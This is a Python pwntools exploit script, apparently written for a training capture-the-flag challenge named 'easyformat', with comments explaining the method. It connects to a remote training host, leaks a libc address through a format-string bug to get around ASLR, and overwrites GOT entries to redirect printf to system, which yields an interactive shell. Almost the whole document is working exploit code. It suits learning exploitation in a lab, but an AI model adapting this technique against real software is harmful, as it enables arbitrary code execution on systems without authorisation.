"""
This version of the script solves the challenge also when ASLR is enabled
(/proc/sys/kernel/randomize_va_space is set to 1). To do so, we use the format
string to leak an address of a known point of the libc from the stack, and we
use it to compute the address of system (as we know its offset w.r.t. the start
of the libc). This script leaks address of the saved EIP of the main, which is
an address belonging to the function __libc_start_main. Alternatively, we could
have leaked an address from the GOT.
"""

from pwn import *

p = remote('training.jinblack.it', '2008')
# To exploit a challenge locally:
# p = process('./easyformat')
f = elf.ELF('./easyformat')
# Be sure to use the same libc in use in the target
# Grab your libc at /usr/lib32/libc.so.6
libc = elf.ELF('libc-2.27.so')

# The displacement on the stack of the start of our format string
# We can infer the displacement by using a debugger or by running the program
# and dump the stack using %x placeholders.
displacement = 4

# We are overwriting exit in the GOT with the address of the start of the
# function vuln, and printf in the GOT with the address of system in the libc.
exit_got = f.got['exit']
printf_got = f.got['printf']
vuln_symbol = f.symbols['vuln']

# Useful offsets in the libc
libc_start_main_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']

def calculate_format_string(what_to_write, where_to_write, displacement):
    if (what_to_write >> 16) > (what_to_write & 0xffff):
        first_addr = where_to_write
        second_addr = where_to_write + 2
        first_half = what_to_write & 0xffff
        second_half = what_to_write >> 16
    else:
        first_addr = where_to_write + 2
        second_addr = where_to_write
        first_half = what_to_write >> 16
        second_half = what_to_write & 0xffff
    return p32(first_addr) + p32(second_addr) + \
           "%{}c%{}$hn".format(first_half - 8, displacement) + \
           "%{}c%{}$hn".format(second_half - first_half, displacement + 1)

# First step of the exploit: use a format string vulnerability to (a) overwrite
# exit in the GOT with the address of vuln, and (b) leak the address of the
# main's return address from the stack. By helping ourselves with a debugger,
# we can infer that the offset of the address of the main's return address is
# 75. From gdb we also see that this points to __libc_start_main + 241.

what_to_write = vuln_symbol
where_to_write = exit_got

format_string = calculate_format_string(what_to_write, where_to_write, displacement)

p.sendline(format_string + "%75$x")

# Read the leaked value and compute the address of system

s = p.readline().strip()[-8:].decode('hex')

libc_base = u32(s, endianness="big") - libc_start_main_offset - 241

system_address = libc_base + system_offset

# Second step of the exploit: use a format string vulnerability to overwrite
# printf in the GOT with the address of system in the libc.

what_to_write = system_address
where_to_write = printf_got

format_string = calculate_format_string(what_to_write, where_to_write, displacement)

p.sendline(format_string)

p.interactive()

